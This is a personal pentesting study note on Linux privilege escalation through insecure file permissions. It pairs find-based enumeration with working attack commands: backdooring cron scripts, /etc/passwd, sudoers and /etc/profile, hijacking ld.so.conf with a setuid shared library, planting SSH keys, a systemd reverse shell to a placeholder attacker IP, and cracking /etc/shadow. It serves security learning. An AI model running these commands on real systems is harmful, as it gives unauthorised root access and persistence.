---
created: 12-01-2026
tags:
  - Linux_PrivEsc
  - Linux
---
## Insecure file permissions

File permission misconfigurations are among the most common privilege escalation vectors. The fundamental principle is simple: **if a privileged process reads from, writes to, or executes a file you can modify, or if you can read sensitive files containing credentials or configuration data, you have a pathway to elevated privileges**.

>[!note] To learn more about file permissions in Linux, see [[permissions_&_ownership]].
## Enumeration

### A word on `find`

The [`find`](https://man.archlinux.org/man/find.1.en) command defines several ways for you to find files with specific privileges:

- `-perm 000`
	- Files with **these exact file permission bits**.
	- `-perm 644`: matches files with exactly `rw-r--r--` permissions.

```bash
find / -perm 644
```

- `-perm -000`

	- Files with **all the specified permission bits** set, possibly more.
	- `-perm 644`: matches files with at least `rw-r--r--` permissions set (meaning `644`, `666`, `777`, etc. all match because `644` are a subset of the actual permissions).

```bash
find / -perm -644
```

- `-perm /000`
	- Files with **any one of the specified permission bits** set.
	- `-perm /644`: Matches files where _any_ of the bits `6`, `4`, or `4` are set.

```bash
find / -perm /644
```

- To speed up `find` results and remove useless matches, you can apply this filter to exclude pseudo-filesystems from the search:

```bash
grep -vE '/proc/|/sys/|/run/'
```

>[!tip]+ Filtering noise
>Pseudo filesystems like `/proc`, `/sys`, and `/run` indeed contain a lot of readable files. But they're useless for privilege escalation. You can use `grep` to exclude them:
>```bash
>| grep -vE '/proc/|/sys/|/run/'
>```


>[!note]+ A note on LinPEAS and automation
>Indeed, you can use tools like LinPEAS to automate the detection of files with insecure permissions or any other potential privilege escalation vectors. However, in a restricted environment, manual enumeration is superior and often is the only choice.
### Writable files

If you find a file used by a privileged process you can write to, you can modify its content to try to execute code with elevated privileges.

- Find **world-writable files** (writable by *anyone*):

```bash
find / -type f -perm -002 -ls 2>/dev/null | grep -vE '/proc/|/sys/|/run/'
```

- Find files **writable by your current user** (excluding your home directory):

```bash
find / -type f -writable -ls 2>/dev/null | grep -vE '/proc/|/sys/|/run/' | grep -v "/home/$(whoami)"
```

- Find files **writable but not owned by your current user**:

```bash
find / -writable ! -user `whoami` ! -group `whoami` -type f -ls 2>/dev/null | grep -v '/proc/*\|/sys/*'
```

>[!note] Change `-type f` to `-type d` to search for directories.


### Writable directories

A write permission on a directory allows you do **create** and **rename** files withing them. 

- Find world-writable directories (writable by *anyone*):

```bash
find / -type d -perm -002 -ls 2>/dev/null | grep -vE '/proc/|/sys/|/run/'
```

- Find directories **writable by your current user** (excluding your home directory):

```bash
find / -type f -writable -ls 2>/dev/null | grep -vE '/proc/|/sys/|/run/' | grep -v "/home/$(whoami)"
```

>[!note]+ The sticky bit
>Pay attention to the `/tmp` directory; it should usually be `drwxrwxrwt` (`1777`). The `t` (sticky bit) prevents users from *deleting files owned by other users*. If `/tmp` is `777` (no sticky bit), *you can delete anyone's files located there and replace them with custom files or symlinks*.
>See [[permissions_&_ownership]].

>[!important] Any writable files in `/etc` worth investigation.
### Readable files

- Find **world-readable files** (writable by *anyone*):

```bash
find / -type f -perm -004 -ls 2>/dev/null | grep -vE '/proc/|/sys/|/run/'
```

- Find files **readable by the current user**:

```bash
find / -type f -readable -ls 2>/dev/null | grep -vE '/proc/|/sys/|/run/'
```

- Find files **readable by the current user** but not owned by them:

```bash
find / -readable ! -user `whoami` ! -group `whoami` -type f -ls 2>/dev/null | grep -vE '/proc/|/sys/|/run/'
```

### SUID and SGID files

The goal is to find binaries that execute with **more privileges than the current user**.

- Find all **SUID** binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

```bash
find / -perm u+s -type f 2>/dev/null 
```

- Find all **SGID** binaries:

```bash
find / -perm -2000 -type f 2>/dev/null
```

```bash
find / -perm g+s -type f 2>/dev/null
```

- Find binaries with **SUID or SGID** bits set:

```bash
find / -type f -a \( -perm u+s -o -perm -g+s \) -ls 2>/dev/null
```

```bash
find / -type f -a \( -perm -2000 -o -perm -4000 \) -ls 2>/dev/null
```

- Find binaries with both **SUID and SGID** set:

```bash
find / -type f -a \( -perm u+s -a -perm -g+s \) -ls 2>/dev/null
```

```bash
find / -perm /6000 -type f 2>/dev/null
```


>[!note] See [[SUID_&_SGID_privilege_escalation]].

## Exploiting writable configuration files

### Writable scripts and binaries

If you can find a scripts (e.g., `.sh`, `.py`, `.pl`, etc.) you can write to that is executed by a privileged process or user, you have arbitrary code execution.

```bash
find / -type f -name "*.sh" -writable 2>/dev/null
```

- You can use [`pspy`](https://github.com/DominicBreuker/pspy) to monitor processes and determine what scripts are actually used:

```bash
./pspy64 -pf -i 1000
```

Let `pspy` run for several minutes to capture process execution patterns. You'll see output showing processes being spawned, including their UIDs, which tells you what user is executing them.

>[!note]+ `pspy` installation
>```bash
>wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 && chmod +x pspy64
>```

- If you identify a writable script periodically executed with elevated privileges (e.g., by a Cron job, systemd timer, `logrotate`, or other users), prepend your payload to the file:

```bash
sed -i '1i\chmod +s /bin/bash' /opt/scripts/backup.sh
```

>[!note]+ Prepending the payload is generally more reliable than appending, in case the script exits early.

This is a general principle used in numerous privilege escalation techniques, such as privilege escalation through Cron jobs, systemd services, or `logrotate`:

- Writable system cron tabs: [[Cron_jobs_privilege_escalation]].
- Writable systemd unit files: [[systemd_timers_and_services]].
- Writable scripts executed by `logrotate`: [[Inside the System/_logrotate_privilege_escalation]].

### Writable `authorized_keys` file

The `~/.ssh/authorized_keys` file in a user's home directory determines who can log in as that user via SSH. It lists public SSH keys such that clients with matching private keys can authenticate. If you can modify any such file, you can gain command execution as the corresponding user.

1. Find writable `authorized_keys` files:

```bash
find / -name "authorized_keys" -writable 2>/dev/null
```
 
2. On your attacking machine, generate a key pair:

```bash
ssh-keygen -t rsa -b 4096 -f privesc_key
```

2. Copy the **public key** (`privesc_key.pub`) and append it to the target `authorized_keys`:

```bash
echo 'ssh-ed25519 AAAA...' >> /home/<username>/.ssh/authorized_keys
```

4. Connect via SSH:

```bash
ssh -i ssh_key <username>@<target_ip_address>
```

### Writable `/etc/passwd`

Unless a centralized credential system such as Active Directory or LDAP is used, passwords are stored in `/etc/shadow`, which is not readable by normal users.
Historically however, password hashes and other account information were stored in the world-readable file `/etc/passwd`. For backwards compatibility, **if a password hash is present in the second field of an `/etc/passwd` user record, it is considered valid for authentication and it takes precedence over the respective entry in `/etc/shadow`**. 

This means that if you can write into `/etc/passwd`, you can in fact set an arbitrary password for any account.

>[!warning] If you corrupt `/etc/passwd` or `/etc/shadow`, you won't be able to log in via SSH or console (via PAM) at all (guess how I know it). 

>[!warning]+ Always backup `/etc/passwd` before modification.
> 
> ```bash
> cp /etc/passwd /tmp/passwd.bak
> ```

>**Option 1: Add a user with UID `0` (second root) and no password:**

```bash
/bin/echo 'root2::0:0:root:/root:/bin/bash' >> /etc/passwd
```

```bash
su root2
```

>[!warning] PAM (Pluggable Authenticaiton Modules) configuration may restrict multiple users with UID `0` or empty passwords.

>**Option 2: Remove root password marker:**

```bash
# change
root:x:0:0:root:/root:/bin/bash
# ---^---

# to
root::0:0:root:/root:/bin/bash
# ---^---
```

```bash
su root
```

>**Option 3: Add user with UID `0` and a known password:**

1. Generate a new password hash:

```bash
openssl passwd -1 -salt xyz passwd123
```

```bash
$1$xyz$6nCBk2TSD.dV7VJmyUvKL0
```

2. Append a new user line:

```bash
echo 'attacker:$1$xyz$6nCBk2TSD.dV7VJmyUvKL0:0:0:root:/root:/bin/bash' >> /etc/passwd
```

- One-liner:

```bash
hash=$(openssl passwd -1 -salt xyz passwd123) && \
echo "attacker:${hash}:0:0:root:/root:/bin/bash" >> /etc/passwd && \
su attacker
```

### Writable `/etc/sudoers` or `/etc/sudoers.d/*`

The `sudoers` file defines who can run what as whom using `sudo`. If you can write to it, you can grant yourself unrestricted `sudo` access.

1. Give your current user full `sudo` permissions without a password:

```bash
echo 'user ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/pwned
```

>[!note] Files `/etc/sudoers.d/*` are often forgotten, and they're even safer than editing main file.

2. Spawn privileged shell:

```bash
sudo su
```

>[!note] In `sudoers`, when multiple entries match for a user, the last match is used; not necessarily the most specific match. See [`SUDOERS FILE FORMAT, sudoers —  man pages`](https://man.archlinux.org/man/sudoers.5.en#SUDOERS_FILE_FORMAT).

>[!warning] If you corrupt `/etc/sudoers`, you won't be able to use `sudo` (direct root login remains possible via SSH, if enabled and password is known).

### Writable `/etc/ld.so.conf`

Most Linux executables are **dynamically linked**, meaning they rely on shared libraries (`.so` files in `/lib`, `/usr/lib`, etc.) loaded at runtime. The **dynamic linker**, typically [`ld-linux.so*`](https://man.archlinux.org/man/ld.so.8.en) (commonly referred to as `ld.so`), is the component responsible for identifying **which libraries** the program needs and **where to find them** on the disk, then loading them into memory and linking.

In addition to the libraries specified by the binaries themselves (`RPATH`, `RUNPATH`) and the environment (`LD_PRELOAD`, `LD_LIBRARY_PATH`), or any default paths (`/lib`, `/usr/lib`), the dynamic linker searches the **directories specified in `/etc/ld.so.conf` and `/etc/ld.so.conf.d/*.conf` files**.

>If you can **write to `/etc/ld.so.conf` or any `*.conf` file in `/etc/ld.so.conf.d/`**, you can **add your controlled directory to the global library search path**. Any **dynamically linked SUID or SGID binary** that resolves libraries via this path can be coerced into loading **your malicious shared object** instead of the legitimate one, and **execute your code with elevated privileges**.

The attack only works with binaries that rely on libraries whose resolution depends on paths specified in `ls.so` configuration files. This happens when a library is specified **by name** (not absolute path), and it's not found in directories searched before those in `/etc/ld.so.conf`/`/etc/ld.so.conf.d/*.conf`. `strace` would show `ENOENT` error in such cases.

>[!example]+ 
> ```bash
> strace -f -e trace=open,openat,access,execve /path/to/binary 2>&1 | grep -E "\.so|ENOENT"
> ```
> 
> ```bash
> openat(AT_FDCWD, "/development/tls/x86_64/libshared.so", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
> ```

Once you have both:
- Write access to `ld.so` configuration, and
- A candidate SUID/SGID binary whose library resolution depends on it

The exploitation flow is:

1. Create a malicious shared library

```c
// /tmp/lib/privesc.c
#include <stdio.h>
#include <stdlib.h>

static void __attribute__ ((constructor)) init(void) {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
```

>[!note] The constructor function executes automatically as soon as the library is loaded. 

2. Compile the library:

```bash
gcc -shared -fPIC -o /tmp/lib/privesc.so privesc.c
```

3. Add your directory to the linker configuration:

```bash
/bin/echo '/tmp/lib' >> /etc/ld.so.conf.d/custom.conf
```

4. Rebuild the linker cache:

```bash
/sbin/ldconfig
```

5. Execute the vulnerable SUID/SGID binary.

When the binary resolves its libraries, the dynamic linker loads your malicious `.so`, and executes the constructor, and your payload runs with elevated privileges (because it's SUID/SGID).

>[!note] To learn more about shared library hijacking, refer to [[shared_library_hijacking]].

### Writable `/etc/profile` and `/etc/bash.bashrc`

`/etc/profile` and `/etc/bash.bashrc` are **global shell startup files**. They're executed **once per every login session**, specifically when a **login shell** is started, after per-used startup files (`~/.profile`, `~/.bashrc`).

If you can write to any of those (`/etc/profile`, `/etc/profile.d/*`, `/etc/bash.bashrc`), **your payload will be executed by any user who logs in**, including root. This works with TTY logins, SSH connections, and login shells started with `su -` or `sudo -i`.
Put it in other way, this grants **code execution in the context of whoever opens the shell**.

```bash
echo 'chmod +s /bin/bash' >> /etc/profile
```

### Writable crontab files (`/etc/cron*`)

System cron jobs are executed by the `crond` daemon that typically runs as **root**. Unlike user crontabs, system-wide cron configuration files — `/etc/crontab`, `/etc/cron.*`, and files in `/etc/cron.d/*` — explicitly define **which user** a command is executed as. If you can modify any of these files or scripts executed by cron jobs inside, **you gain code execution as root**.

Relevant files include:
- `/etc/crontab`
- `/etc/cron.d/*`
- Executables in:
	- `/etc/cron.hourly/`
	- `/etc/cron.daily/`        
	- `/etc/cron.weekly/`
	- `/etc/cron.monthly/`

>[!note] See [[Cron_jobs_privilege_escalation]].

>[!example]+
> ```bash
> echo "* * * * * root chmod +s /bin/bash" >> /etc/crontab
> ```
> 
> ```bash
> /tmp/rootbash -p
> ```

### Writable systemd service files

Systemd runs units as root. Unit configuration is defined in **unit files**. If you can modify the unit file of an **enabled service**, you get command execution as root.

If you can modify any of the unit files of the enabled services, you can escalate privileges.


```bash
ls -l /etc/systemd/system/
```

```bash 
ls -la /run/systemd/system/
```

```bash
ls -l /lib/systemd/system/
```

- If you find a writable service unit file, add the `ExecStart` directive with commands you want to execute:

```bash
[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<attacker_ip_address>/1337 0>&1'
```

Changes will take effect on next system boot, or when systemd configuration is reloaded and the service is restarted (or a timer triggers that service once again).

- To reload and restart manually (if you can):

```bash
systemctl daemon-reexec
systemctl restart vulnerable.service
```

- If you don't have permission to restart the service — wait for reboot.

>[!note] See [[systemd_timers_and_services]].

## Readable files

### Readable `/etc/shadow`

The `/etc/shadow` file contains the password hashes for all users. By default, it is readable only by root.

**If you find it readable (e.g., `644` or `640` and you're in the `shadow` group)**, you can extract the hashes and attempt cracking them offline using tools like JohnTheRipper:

1. Use `unshadow` (part of the JohnTheRipper package) to combine `/etc/shadow` and `/etc/passwd` into a format John understands:

```bash
unshadow /etc/passwd /etc/shadow > hashes.txt
```

2. Run John to crack the hashes:

```bash
john --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

>[!example]+
> - Save the root's `/etc/shadow` entry to `shadow.txt` on your attacker machine:
> 
> ```bash
> cat /etc/shadow | grep root
> ```
> 
> ```bash
> # copy and save the output to shadow.txt on your attacker machine:
> root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:9999  
> 9:7:::
> ```
> 
> - Save the root's `etc/passwd` entry to `passwd.txt`:
> 
> ```bash
> cat /etc/passwd | grep root
> ```
> 
> ```bash
> # save the output to passwd.txt:
> root:x:0:0:root:/root:/bin/bash
> ```
> 
> - Use `unshadow` to combine the two into a single file:
> 
> ```bash
> unshadow passwd.txt shadow.txt > hashes.txt
> ```
> 
> - Run John to crack it:
> 
> ```bash
> john --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
> ```
> 
> ```bash
> Using default input encoding: UTF-8
> Loaded 1 password hash (crypt, generic crypt(3) [?/64])
> Cost 1 (algorithm [1:descrypt 2:md5crypt 3:sunmd5 4:bcrypt 5:sha256crypt 6:sha512crypt]) is 6 for all loaded hashes
> Cost 2 (algorithm specific iterations) is 5000 for all loaded hashes
> Will run 4 OpenMP threads
> Press 'q' or Ctrl-C to abort, almost any other key for status
> password123      (root)     
> 1g 0:00:00:00 DONE (2026-01-02 09:05) 1.754g/s 2526p/s 2526c/s 2526C/s teacher..michel
> Use the "--show" option to display all of the cracked passwords reliably
> Session completed. 
> ```
> 
> Log in with the discovered hash:
> 
> ```bash
> su root
> ```
> 
> ```bash
> user@debian:~$ su root  
> Password:    
> root@debian:/home/user# whoami  
> root  
> root@debian:/home/user#
> ```
### Passwords in the world-readable `/etc/passwd`

As was mentioned above, passwords stored in `/etc/passwd` take precedence over those in `/etc/shadow`. This means that if you find a password hash in `/etc/passwd` and crack it, you can log in to the target account, no matter what's in `/etc/shadow`.

```bash
grep -v "x" /etc/passwd
```

### Sensitive configuration files

Even if all well-known privilege escalation techniques fail, it's always worth searching for plaintext credentials 

**High-Value Targets:**
- Database configuration
	- `/etc/mysql/debian.cnf` (Debian/Ubuntu auto-login credentials)
    - `/var/www/html/wp-config.php` (WordPress DB passwords)
    - `/etc/postgresql/*/main/pg_hba.conf` (Auth methods, sometimes weak)

- Web root
    - `/var/www/html/config.php`, `.env` files.

- Backup files
    - `*.bak`, `*.old`, `*.swp` (Vim swap files).

>[!note] See [[credentials_hunting_and_sensitive_information]].   
## References and further reading

- [`SUDOERS FILE FORMAT, sudoers —  man pages`](https://man.archlinux.org/man/sudoers.5.en#SUDOERS_FILE_FORMAT)
- [`find — man pages`](https://man.archlinux.org/man/find.1.en)

>[!tip]+
> Other interesting files you may want to target:
> - Sensitive configuration files 
> 	- Writable `/etc/exports` or `/etc/fstab` allows you to mound NFS shares or disk partitions.
> - Writable directories in `$PATH` (see [[PATH_hijacking]])
> - Writable library directories
> 
